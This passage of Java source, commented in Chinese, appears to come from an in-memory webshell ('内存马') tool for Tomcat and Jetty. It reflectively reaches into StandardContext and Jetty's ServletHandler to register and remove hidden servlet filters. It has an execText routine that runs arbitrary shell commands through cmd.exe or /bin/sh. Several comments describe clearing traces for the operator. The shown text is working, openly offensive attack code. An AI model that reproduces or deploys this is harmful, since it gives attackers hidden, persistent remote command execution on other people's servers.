        StringBuilder sb = new StringBuilder("{\"container\":").append(json(containerKind()));
        sb.append(",\"via\":").append(json(via)).append(",\"filters\":[");
        for (int i = 0; i < items.size(); i++) {
            if (i > 0) {
                sb.append(',');
            }
            sb.append(items.get(i));
        }
        return sb.append("]}").toString();
    }

    /** 卸载：三处登记都清掉，避免留下「能触发但列不出来」的残影。 */
    private static String msRemove(String name) {
        if (name == null || name.length() == 0) {
            return "ERROR:缺少 filter 名";
        }
        String[] order = strategies();
        StringBuilder err = new StringBuilder();
        for (int i = 0; i < order.length; i++) {
            try {
                String r = "";
                if ("tomcat-context".equals(order[i])) {
                    r = removeTomcat(name);
                } else if ("jetty-handler".equals(order[i])) {
                    r = removeJetty(name);
                } else {
                    r = removeGeneric(name);
                }
                if (r != null && r.length() > 0) {
                    return r;
                }
            } catch (Throwable t) {
                // 反射 + Proxy 会把真实异常裹两层，只报 InvocationTargetException 等于没说：
                // 真正有用的是最内层的 servletContextAlreadyInitialized 这类原因。
                Throwable c = rootCause(t);
                err.append(order[i]).append(" 失败(").append(c.getClass().getSimpleName());
                if (c.getMessage() != null) {
                    err.append(": ").append(c.getMessage());
                }
                err.append("); ");
            }
        }
        if (err.length() == 0) {
            // 各条路径都没抛错、也没找到同名 filter：说明本来就没了，不算失败
            return "OK 未找到 " + name + "（容器 " + containerKind() + "，可能已卸载）";
        }
        return "ERROR:卸载失败（容器 " + containerKind() + "）：" + err;
    }

    private static String removeTomcat(String name) throws Exception {
        Object ctx = stdCtx();
        int hit = 0;

        // FilterDef / FilterMap 优先走 StandardContext 的公开方法：
        // 直接改字段在不同 Tomcat 版本上字段名会变（filterMaps 在 10.x 里就不是
        // 我们原先假设的位置），公开方法是稳定的注入/卸载路径。
        Object defs = safeCall(ctx, "findFilterDefs");
        if (defs != null && defs.getClass().isArray()) {
            int n = java.lang.reflect.Array.getLength(defs);
            for (int i = 0; i < n; i++) {
                Object d = java.lang.reflect.Array.get(defs, i);
                Object fn = safeCall(d, "getFilterName");
                if (fn != null && name.equals(String.valueOf(fn))) {
                    safeCall(ctx, "removeFilterDef", d);
                    hit++;
                }
            }
        }
        Object maps = safeCall(ctx, "findFilterMaps");
        if (maps != null && maps.getClass().isArray()) {
            int n = java.lang.reflect.Array.getLength(maps);
            for (int i = 0; i < n; i++) {
                Object fm = java.lang.reflect.Array.get(maps, i);
                Object fn = safeCall(fm, "getFilterName");
                if (fn != null && name.equals(String.valueOf(fn))) {
                    safeCall(ctx, "removeFilterMap", fm);
                    hit++;
                }
            }
        }
        // filterConfigs 是实例缓存，没有公开移除接口，只能拔字段
        Object cfgs = safeCall(ctx, "getFilterConfigs");
        if (cfgs == null) {
            try {
                cfgs = field(ctx, "filterConfigs");
            } catch (NoSuchFieldException ignored) {
                // 版本差异，忽略
            }
        }
        if (cfgs instanceof java.util.Map && ((java.util.Map) cfgs).remove(name) != null) {
            hit++;
        }
        if (hit == 0) {
            return "";
        }
        return "OK removed " + name + "（Tomcat，清理 " + hit + " 处登记）";
    }

    /** Jetty：从 filters 列表摘掉 holder，并清掉指向它的映射，否则匹配到空 holder 会 500。 */
    private static String removeJetty(String name) throws Exception {
        Object handler = jettyServletHandler();
        java.util.List filters = jettyList(handler, "_filters");
        Object target = null;
        for (int i = 0; i < filters.size(); i++) {
            Object fh = filters.get(i);
            if (name.equals(String.valueOf(safeCall(fh, "getName")))) {
                target = fh;
                break;
            }
        }
        if (target == null) {
            return "";
        }
        filters.remove(target);
        storeJettyList(handler, "_filters", filters);
        int hit = 1;
        java.util.List maps = null;
        try {
            maps = jettyList(handler, "_filterMappings");
        } catch (Throwable ignored) {
            maps = null;
        }
        if (maps != null) {
            for (int i = maps.size() - 1; i >= 0; i--) {
                Object fm = maps.get(i);
                if (name.equals(String.valueOf(safeCall(fm, "getFilterName")))) {
                    maps.remove(i);
                    hit++;
                }
            }
            storeJettyList(handler, "_filterMappings", maps);
        }
        try {
            call(target, "stop");
        } catch (Throwable ignored) {
            // 已经停了就不用管
        }
        // 9.4 会把 filter 链缓存起来，不失效的话卸载后还会走旧链
        safeCall(handler, "invalidateChainsCache");
        return "OK removed " + name + "（Jetty，清理 " + hit + " 处登记）";
    }

    /**
     * Servlet 3.0 没有运行时卸载接口：addFilter 只增不删。
     * 这里如实报错，而不是假装成功——否则操作员会以为痕迹已经清掉了。
     */
    private static String removeGeneric(String name) {
        Object regs = safeCall(sApp, "getFilterRegistrations");
        if (!(regs instanceof java.util.Map)) {
            return "";
        }
        if (!((java.util.Map) regs).containsKey(name)) {
            return "";
        }
        return "ERROR:" + containerKind() + " 未提供运行时卸载接口（Servlet 3.0 只增不删），"
                + "该 filter 仍在生效：需重启容器，或改用 tomcat-context / jetty-handler 路径注入";
    }

    /** 从 ServletContext 里找到 Jetty 的 ServletHandler（逐层找「谁提供 getServletHandler」，不猜字段名）。 */
    private static Object jettyServletHandler() throws Exception {
        if (sApp == null) {
            throw new IllegalStateException("载体未注入 ServletContext");
        }
        Object h = findServletHandler(sApp, 2);
        if (h != null) {
            return h;
        }
        throw new IllegalStateException("无法从 " + sApp.getClass().getName() + " 定位 ServletHandler");
    }

    /**
     * Jetty 各版本把 ServletContextHandler 藏在不同字段里（字段名从 _scontextHandler
     * 到 _contextHandler 都出现过，类型也从 ServletContextHandler 退化成 ContextHandler），
     * 所以按「这个对象能不能给出 ServletHandler」判断，不按名字或类型匹配。
     */
    private static Object findServletHandler(Object o, int depth) {
        if (o == null || depth < 0) {
            return null;
        }
        if (hasMethod(o, "getServletHandler")) {
            try {
                Object h = call(o, "getServletHandler");
                if (h != null) {
                    return h;
                }
            } catch (Throwable ignored) {
                // 继续往下找
            }
        }
        Class<?> c = o.getClass();
        while (c != null) {
            java.lang.reflect.Field[] fs;
            try {
                fs = c.getDeclaredFields();
            } catch (Throwable t) {
                return null;
            }
            for (int i = 0; i < fs.length; i++) {
                if (java.lang.reflect.Modifier.isStatic(fs[i].getModifiers()) || fs[i].getType().isPrimitive()) {
                    continue;
                }
                Object v;
                try {
                    fs[i].setAccessible(true);
                    v = fs[i].get(o);
                } catch (Throwable t) {
                    continue;
                }
                if (v == null) {
                    continue;
                }
                if (hasMethod(v, "getServletHandler")) {
                    try {
                        Object h = call(v, "getServletHandler");
                        if (h != null) {
                            return h;
                        }
                    } catch (Throwable ignored) {
                        // 换下一个字段
                    }
                }
                if (depth > 0) {
                    Object h = findServletHandler(v, depth - 1);
                    if (h != null) {
                        return h;
                    }
                }
            }
            c = c.getSuperclass();
        }
        return null;
    }

    private static boolean hasMethod(Object o, String name) {
        java.lang.reflect.Method[] ms = o.getClass().getMethods();
        for (int i = 0; i < ms.length; i++) {
            if (name.equals(ms[i].getName())) {
                return true;
            }
        }
        return false;
    }

    /** DispatcherType.REQUEST 的 EnumSet：jakarta / javax 是不同类，只能运行期造。 */
    private static Object dispatcherSet() throws Exception {
        Class<?> dt;
        try {
            dt = Class.forName("jakarta.servlet.DispatcherType");
        } catch (Throwable ignored) {
            dt = Class.forName("javax.servlet.DispatcherType");
        }
        Object req = null;
        Object[] vals = dt.getEnumConstants();
        for (int i = 0; i < vals.length; i++) {
            if ("REQUEST".equals(String.valueOf(vals[i]))) {
                req = vals[i];
            }
        }
        if (req == null) {
            throw new IllegalStateException("DispatcherType 里找不到 REQUEST");
        }
        return java.util.EnumSet.of((java.lang.Enum) req);
    }

    /** 容器种类：优先看 serverInfo，拿不到再按 ServletContext 实现类兜底。 */
    private static String containerKind() {
        String si = serverInfo().toLowerCase();
        if (si.indexOf("tomcat") >= 0) {
            return "tomcat";
        }
        if (si.indexOf("jetty") >= 0) {
            return "jetty";
        }
        if (si.indexOf("undertow") >= 0) {
            return "undertow";
        }
        if (si.indexOf("weblogic") >= 0) {
            return "weblogic";
        }
        if (si.indexOf("websphere") >= 0) {
            return "websphere";
        }
        if (si.indexOf("glassfish") >= 0 || si.indexOf("payara") >= 0) {
            return "glassfish";
        }
        if (sApp != null) {
            String cn = sApp.getClass().getName();
            if (cn.indexOf("StandardContext") >= 0) {
                return "tomcat";
            }
            if (cn.indexOf("jetty") >= 0) {
                return "jetty";
            }
        }
        return "unknown";
    }

    /** 剥掉反射/代理的包装层，拿到真正有信息量的那一层异常。 */
    private static Throwable rootCause(Throwable t) {
        Throwable c = t;
        for (int i = 0; i < 8; i++) {
            boolean wrapper = c instanceof java.lang.reflect.InvocationTargetException
                    || c instanceof java.lang.reflect.UndeclaredThrowableException
                    || c instanceof ExceptionInInitializerError;
            if (wrapper && c.getCause() != null && c.getCause() != c) {
                c = c.getCause();
            } else {
                break;
            }
        }
        return c;
    }

    private static String servletApi() {
        try {
            Class.forName("jakarta.servlet.Filter");
            return "jakarta";
        } catch (Throwable ignored) {
            // 老容器
        }
        try {
            Class.forName("javax.servlet.Filter");
            return "javax";
        } catch (Throwable ignored) {
            return "unknown";
        }
    }

    /**
     * 取 ServletHandler 里的过滤器/映射集合。
     *
     * Jetty 10/11 存成 List（可直接改），9.4 存成数组（FilterHolder[]）—— 按数组存的
     * 版本必须读出来改完再写回，否则「列表里看不到、卸载也找不到」。
     */
    private static java.util.List jettyList(Object handler, String name) throws Exception {
        Object v = field(handler, name);
        if (v instanceof java.util.List) {
            return (java.util.List) v;
        }
        java.util.List out = new java.util.ArrayList();
        if (v != null && v.getClass().isArray()) {
            int n = java.lang.reflect.Array.getLength(v);
            for (int i = 0; i < n; i++) {
                out.add(java.lang.reflect.Array.get(v, i));
            }
        }
        return out;
    }

    /** 回写：List 形态是原地改的，只有数组形态需要按原组件类型重建数组。 */
    private static void storeJettyList(Object handler, String name, java.util.List items) throws Exception {
        Object cur = field(handler, name);
        if (cur instanceof java.util.List) {
            return;
        }
        java.lang.reflect.Field f = fieldRef(handler, name);
        Class<?> ct = f.getType().getComponentType();
        if (ct == null) {
            throw new IllegalStateException("字段 " + name + " 既不是 List 也不是数组");
        }
        Object arr = java.lang.reflect.Array.newInstance(ct, items.size());
        for (int i = 0; i < items.size(); i++) {
            java.lang.reflect.Array.set(arr, i, items.get(i));
        }
        f.set(handler, arr);
    }

    /** 用「宿主对象的类加载器」加载容器类：Jetty 把 org.eclipse.jetty.* 对 webapp 隐藏了。 */
    private static Class<?> hostClass(Object host, String... names) throws ClassNotFoundException {
        ClassLoader cl = host == null ? null : host.getClass().getClassLoader();
        ClassNotFoundException last = null;
        for (int i = 0; i < names.length; i++) {
            try {
                return Class.forName(names[i], true, cl);
            } catch (ClassNotFoundException e) {
                last = e;
            }
        }
        throw last != null ? last : new ClassNotFoundException(names.length > 0 ? names[0] : "");
    }

    /** 按容器给出可尝试的注入路径，顺序即尝试顺序。 */
    private static String[] strategies() {
        String kind = containerKind();
        if ("tomcat".equals(kind)) {
            return new String[]{"tomcat-context", "servletcontext"};
        }
        if ("jetty".equals(kind)) {
            return new String[]{"jetty-handler", "servletcontext"};
        }
        return new String[]{"servletcontext"};
    }

    private static Object stdCtx() throws Exception {
        if (sApp == null) {
            throw new IllegalStateException("载体未注入 ServletContext：内存马只能在 JSP 上下文内操作");
        }
        Object o = sApp;
        for (int i = 0; i < 3; i++) {
            if (o.getClass().getName().endsWith("StandardContext")) {
                return o;
            }
            try {
                o = field(o, "context");
            } catch (NoSuchFieldException e) {
                break;
            }
        }
        if (o.getClass().getName().endsWith("StandardContext")) {
            return o;
        }
        throw new IllegalStateException("无法从 ServletContext 定位 StandardContext（当前 "
                + sApp.getClass().getName() + "）");
    }

    private static Class<?> filterIface() throws Exception {
        try {
            return Class.forName("jakarta.servlet.Filter");
        } catch (Throwable ignored) {
            return Class.forName("javax.servlet.Filter");
        }
    }

    private static String serverInfo() {
        Object v = safeCall(sApp, "getServerInfo");
        return v == null ? "" : String.valueOf(v);
    }

    /** 递归取字段（子类没声明就往父类找）。 */
    private static Object field(Object o, String name) throws Exception {
        return fieldRef(o, name).get(o);
    }

    private static java.lang.reflect.Field fieldRef(Object o, String name) throws Exception {
        Class<?> c = o.getClass();
        while (c != null) {
            try {
                java.lang.reflect.Field f = c.getDeclaredField(name);
                f.setAccessible(true);
                return f;
            } catch (NoSuchFieldException e) {
                c = c.getSuperclass();
            }
        }
        throw new NoSuchFieldException(name);
    }

    /** 按「名字 + 参数个数」找方法调用；重载多时靠参数类型不匹配自然跳过。 */
    private static Object call(Object o, String name, Object... args) throws Exception {
        java.lang.reflect.Method[] ms = o.getClass().getMethods();
        Exception last = null;
        for (int i = 0; i < ms.length; i++) {
            java.lang.reflect.Method m = ms[i];
            if (!name.equals(m.getName()) || m.getParameterTypes().length != args.length) {
                continue;
            }
            try {
                // 模块系统（JDK 9+）下 setAccessible 可能被拒（InaccessibleObjectException），
                // 这时不该整条链断掉——很多容器实现类是不可见的非 public 类，但同名方法
                // 往往在可见的父类/接口上也声明了，继续试下一个重载反而能成。
                try {
                    m.setAccessible(true);
                } catch (Throwable ignored) {
                    // 保持默认可见性继续试
                }
                return m.invoke(o, args);
            } catch (IllegalArgumentException e) {
                last = e;
            } catch (IllegalAccessException e) {
                last = e;
            }
        }
        throw last != null ? last : new NoSuchMethodException(name);
    }

    private static Object safeCall(Object o, String name, Object... args) {
        try {
            return call(o, name, args);
        } catch (Throwable t) {
            return null;
        }
    }

    /** 内存马里的命令执行：只要输出，不拼工作目录标记。 */
    private static String execText(String cmd) throws IOException, InterruptedException {
        String os = System.getProperty("os.name", "").toLowerCase();
        boolean win = os.indexOf("win") >= 0;
        String[] argv = win
                ? new String[]{"cmd.exe", "/c", cmd}
                : new String[]{"/bin/sh", "-c", cmd};
        ProcessBuilder pb = new ProcessBuilder(argv);
        pb.redirectErrorStream(true);
        Process p = pb.start();
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        copy(p.getInputStream(), out);
        p.waitFor();
        return new String(out.toByteArray());
    }

    /** 极简 JSON 字符串转义：只处理会让 JSON 非法的那几个字符。 */
    private static String json(String s) {
        if (s == null) {
            return "null";
        }
        StringBuilder sb = new StringBuilder(s.length() + 8);
        sb.append('"');
        for (int i = 0; i < s.length(); i++) {
            char c = s.charAt(i);
            switch (c) {
                case '"':
                    sb.append("\\\"");
                    break;
                case '\\':
                    sb.append("\\\\");
                    break;
                case '\n':
                    sb.append("\\n");
                    break;
                case '\r':
                    sb.append("\\r");
                    break;
                case '\t':
                    sb.append("\\t");
                    break;
                default:
                    if (c < 0x20) {
                        sb.append(String.format("\\u%04x", (int) c));
                    } else {
                        sb.append(c);
                    }
            }
        }
        return sb.append('"').toString();
    }

    private static final char[] B64 =
            "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/".toCharArray();

    /** 自带 base64：JDK 8 有 java.util.Base64，但目标可能跑在 JDK 6/7 上。 */
    private static String b64(byte[] data) {
        StringBuilder sb = new StringBuilder((data.length + 2) / 3 * 4);
        int i = 0;
        while (i + 2 < data.length) {
            int n = ((data[i] & 0xff) << 16) | ((data[i + 1] & 0xff) << 8) | (data[i + 2] & 0xff);
            sb.append(B64[(n >> 18) & 63]).append(B64[(n >> 12) & 63])
                    .append(B64[(n >> 6) & 63]).append(B64[n & 63]);
            i += 3;
        }
        int rest = data.length - i;
        if (rest == 1) {
            int n = (data[i] & 0xff) << 16;
            sb.append(B64[(n >> 18) & 63]).append(B64[(n >> 12) & 63]).append("==");
        } else if (rest == 2) {
            int n = ((data[i] & 0xff) << 16) | ((data[i + 1] & 0xff) << 8);
            sb.append(B64[(n >> 18) & 63]).append(B64[(n >> 12) & 63])
                    .append(B64[(n >> 6) & 63]).append('=');
        }
        return sb.toString();
    }

    private static byte[] unb64(String s) {
        ByteArrayOutputStream out = new ByteArrayOutputStream(s.length() * 3 / 4 + 4);
        int buf = 0;
        int bits = 0;
        for (int i = 0; i < s.length(); i++) {
            char c = s.charAt(i);
            if (c == '=' || c == '\n' || c == '\r') {
                continue;
            }
            int v = index(c);
            if (v < 0) {
                continue;
            }
            buf = (buf << 6) | v;
            bits += 6;
            if (bits >= 8) {
                bits -= 8;
                out.write((buf >> bits) & 0xff);
            }
        }
        return out.toByteArray();
    }

    private static int index(char c) {
        for (int i = 0; i < B64.length; i++) {
            if (B64[i] == c) {
                return i;
            }
        }
        return -1;
    }

    private static void copy(InputStream in, ByteArrayOutputStream out) throws IOException {
        byte[] buf = new byte[8192];
        int n;
        while ((n = in.read(buf)) > 0) {
            out.write(buf, 0, n);
        }
        in.close();
    }
}
